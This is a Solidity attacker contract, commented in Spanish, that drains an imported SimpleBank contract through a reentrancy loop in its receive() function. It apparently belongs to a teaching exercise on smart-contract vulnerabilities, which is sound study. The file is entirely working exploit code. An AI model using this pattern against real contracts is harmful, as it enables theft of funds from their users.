// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {SimpleBank} from "./SimpleBank.sol";

/// @title Attacker — contrato que explota el reentrancy de SimpleBank
/// @notice Deposita 1 ETH, pide withdraw, y en el receive() vuelve a llamar
///         withdraw() mientras el banco todavía tenga fondos. Cada re-entrada
///         pasa el require porque userBalance[msg.sender] aún no fue puesto en 0.
contract Attacker {
    SimpleBank simpleBank;

    constructor(address simpleBankAddress_) {
        simpleBank = SimpleBank(simpleBankAddress_);
    }

    function attack() external payable {
        simpleBank.deposit{value: msg.value}();
        simpleBank.withdraw();
    }

    /// @dev Cada vez que el banco nos manda ETH cae acá. Mientras quede
    ///      al menos 1 ETH en el banco, volvemos a entrar a withdraw().
    receive() external payable {
        if (address(simpleBank).balance >= 1 ether) {
            simpleBank.withdraw();
        }
    }
}
